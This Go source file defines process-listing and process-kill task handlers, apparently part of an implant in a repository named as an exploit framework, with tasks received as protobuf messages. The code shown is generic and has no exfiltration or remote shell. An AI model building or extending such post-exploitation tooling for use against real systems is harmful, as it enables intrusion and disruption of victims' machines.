package tasks

import (
	"context"
	"fmt"
	"os"

	pb "github.com/KKingZero/erebus-exploit-framwork/pkg/pb"
	"google.golang.org/protobuf/proto"
)

func executeProcessList(_ context.Context, _ []byte) ([]byte, error) {
	procs, err := listProcesses()
	if err != nil {
		return nil, fmt.Errorf("list processes: %w", err)
	}
	result := &pb.ProcessListResult{Processes: procs}
	return proto.Marshal(result)
}

func executeProcessKill(_ context.Context, data []byte) ([]byte, error) {
	task := &pb.ProcessKillTask{}
	if err := proto.Unmarshal(data, task); err != nil {
		return nil, fmt.Errorf("unmarshal process kill task: %w", err)
	}

	proc, err := os.FindProcess(int(task.Pid))
	if err != nil {
		return nil, fmt.Errorf("find process %d: %w", task.Pid, err)
	}

	if err := proc.Kill(); err != nil {
		return nil, fmt.Errorf("kill process %d: %w", task.Pid, err)
	}

	result := &pb.ProcessKillResult{Success: true}
	return proto.Marshal(result)
}
